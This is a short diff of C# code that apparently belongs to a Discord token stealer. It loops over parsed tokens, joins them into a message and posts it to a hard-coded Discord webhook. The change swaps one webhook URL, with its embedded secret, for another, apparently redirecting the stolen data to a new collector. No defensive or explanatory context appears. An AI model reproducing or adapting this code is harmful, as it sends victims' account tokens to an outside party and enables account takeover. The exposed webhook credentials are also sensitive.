@@ -22,5 +22,5 @@ await foreach (var token in TokenParser.ParseAsync())
 
 var message = content.ToString();
 
-using var webhook = new DiscordWebhookClient("https://discord.com/api/webhooks/948319193005187142/MrCwuZJ1hOGAdwU1QucGn_rTl2xWXQlgR4t3ke9os1g-YMtgZuEazS92bL7X6tsDBHR6");
+using var webhook = new DiscordWebhookClient("https://discord.com/api/webhooks/1230453243042070558/b8rBODHxzRagpNBrjL5cpPEEbDrfjngE2icghEVa-wKCSJfwenZTYgFyI5T7EwChjhOL");
 await webhook.SendMessage(new DiscordMessage(message));
